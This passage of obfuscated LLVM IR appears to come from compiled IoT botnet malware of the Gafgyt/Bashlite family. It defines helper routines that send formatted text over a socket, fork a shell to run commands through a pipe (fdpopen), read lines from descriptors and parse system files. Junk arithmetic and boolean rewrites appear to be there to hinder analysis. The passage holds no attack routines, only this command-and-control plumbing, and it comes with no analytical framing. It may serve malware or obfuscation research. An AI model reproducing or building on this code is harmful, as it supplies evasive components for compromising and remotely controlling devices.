  %95 = xor i32 %94, -1
  %96 = xor i32 2, -1
  %97 = xor i32 -41949324, -1
  %98 = or i32 %95, %96
  %99 = or i32 -41949324, %97
  %100 = xor i32 %98, -1
  %101 = and i32 %100, %99
  %102 = and i32 %94, 2
  %103 = icmp ne i32 %101, 0
  br i1 %103, label %104, label %115

; <label>:104:                                    ; preds = %93
  %105 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %105, i32 45)
  %106 = load i32, i32* %20, align 4
  %107 = add i32 %106, -863883998
  %108 = add i32 %107, 1
  %109 = sub i32 %108, -863883998
  %110 = add nsw i32 %106, 1
  store i32 %109, i32* %20, align 4
  %111 = load i32, i32* %13, align 4
  %112 = sub i32 0, -1
  %113 = sub i32 %111, %112
  %114 = add nsw i32 %111, -1
  store i32 %113, i32* %13, align 4
  br label %118

; <label>:115:                                    ; preds = %93, %90
  %116 = load i8*, i8** %17, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 -1
  store i8* %117, i8** %17, align 8
  store i8 45, i8* %117, align 1
  br label %118

; <label>:118:                                    ; preds = %115, %104
  br label %119

; <label>:119:                                    ; preds = %118, %87
  %120 = load i32, i32* %20, align 4
  %121 = load i8**, i8*** %9, align 8
  %122 = load i8*, i8** %17, align 8
  %123 = load i32, i32* %13, align 4
  %124 = load i32, i32* %14, align 4
  %125 = call i32 @prints(i8** %121, i8* %122, i32 %123, i32 %124)
  %126 = add i32 %120, 1547051048
  %127 = add i32 %126, %125
  %128 = sub i32 %127, 1547051048
  %129 = add nsw i32 %120, %125
  store i32 %128, i32* %8, align 4
  br label %130

; <label>:130:                                    ; preds = %119, %25
  %131 = load i32, i32* %8, align 4
  ret i32 %131
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %65

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %63

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 65280, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65280
  %62 = ashr i32 %60, 8
  br label %63

; <label>:63:                                     ; preds = %53, %52
  %64 = phi i32 [ -1, %52 ], [ %62, %53 ]
  store i32 %64, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %63, %19
  %66 = load i32, i32* %2, align 4
  ret i32 %66
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %39

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 0, 1
  %37 = sub i32 %35, %36
  %38 = add nsw i32 %35, 1
  store i32 %37, i32* %8, align 4
  br label %9

; <label>:39:                                     ; preds = %25
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %39
  br label %45

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %4, align 8
  br label %45

; <label>:45:                                     ; preds = %43, %42
  %46 = phi i8* [ null, %42 ], [ %44, %43 ]
  ret i8* %46
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %27

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = and i64 %16, %22
  %24 = xor i64 %16, %22
  %25 = or i64 %23, %24
  %26 = or i64 %16, %22
  store i64 %25, i64* %3, align 8
  br label %4

; <label>:27:                                     ; preds = %12
  %28 = load i64, i64* %3, align 8
  ret i64 %28
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %84 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %47
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %121

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = or i1 %31, %33
  %35 = xor i1 %29, true
  br label %36

; <label>:36:                                     ; preds = %24, %19
  %37 = phi i1 [ false, %19 ], [ %34, %24 ]
  br label %38

; <label>:38:                                     ; preds = %36, %13
  %39 = phi i1 [ true, %13 ], [ %37, %36 ]
  %40 = xor i1 %39, true
  %41 = and i1 true, %40
  %42 = xor i1 true, true
  %43 = and i1 %39, %42
  %44 = or i1 %41, %43
  %45 = xor i1 %39, true
  %46 = zext i1 %44 to i32
  store i32 %46, i32* %3, align 4
  br label %121

; <label>:47:                                     ; preds = %2
  %48 = load i8*, i8** %5, align 8
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %70

; <label>:52:                                     ; preds = %47
  %53 = load i8*, i8** %4, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 1
  %55 = load i8*, i8** %5, align 8
  %56 = getelementptr inbounds i8, i8* %55, i64 1
  %57 = call i32 @wildString(i8* %54, i8* %56)
  %58 = icmp ne i32 %57, 0
  %59 = xor i1 %58, true
  %60 = and i1 true, %59
  %61 = xor i1 true, true
  %62 = and i1 %58, %61
  %63 = xor i1 true, true
  %64 = and i1 %63, true
  %65 = and i1 true, %61
  %66 = or i1 %60, %62
  %67 = or i1 %64, %65
  %68 = xor i1 %66, %67
  %69 = xor i1 %58, true
  br label %70

; <label>:70:                                     ; preds = %52, %47
  %71 = phi i1 [ false, %47 ], [ %68, %52 ]
  %72 = xor i1 %71, true
  %73 = and i1 true, %72
  %74 = xor i1 true, true
  %75 = and i1 %71, %74
  %76 = xor i1 true, true
  %77 = and i1 %76, true
  %78 = and i1 true, %74
  %79 = or i1 %73, %75
  %80 = or i1 %77, %78
  %81 = xor i1 %79, %80
  %82 = xor i1 %71, true
  %83 = zext i1 %81 to i32
  store i32 %83, i32* %3, align 4
  br label %121

; <label>:84:                                     ; preds = %2
  %85 = load i8*, i8** %4, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = call i32 @toupper(i32 %87) #10
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = call i32 @toupper(i32 %91) #10
  %93 = icmp eq i32 %88, %92
  br i1 %93, label %94, label %107

; <label>:94:                                     ; preds = %84
  %95 = load i8*, i8** %4, align 8
  %96 = getelementptr inbounds i8, i8* %95, i64 1
  %97 = load i8*, i8** %5, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = call i32 @wildString(i8* %96, i8* %98)
  %100 = icmp ne i32 %99, 0
  %101 = xor i1 %100, true
  %102 = and i1 true, %101
  %103 = xor i1 true, true
  %104 = and i1 %100, %103
  %105 = or i1 %102, %104
  %106 = xor i1 %100, true
  br label %107

; <label>:107:                                    ; preds = %94, %84
  %108 = phi i1 [ false, %84 ], [ %105, %94 ]
  %109 = xor i1 %108, true
  %110 = and i1 false, %109
  %111 = xor i1 false, true
  %112 = and i1 %108, %111
  %113 = xor i1 true, true
  %114 = and i1 %113, false
  %115 = and i1 true, %111
  %116 = or i1 %110, %112
  %117 = or i1 %114, %115
  %118 = xor i1 %116, %117
  %119 = xor i1 %108, true
  %120 = zext i1 %118 to i32
  store i32 %120, i32* %3, align 4
  br label %121

; <label>:121:                                    ; preds = %107, %70, %38, %9
  %122 = load i32, i32* %3, align 4
  ret i32 %122
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %91, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %93

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %91

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
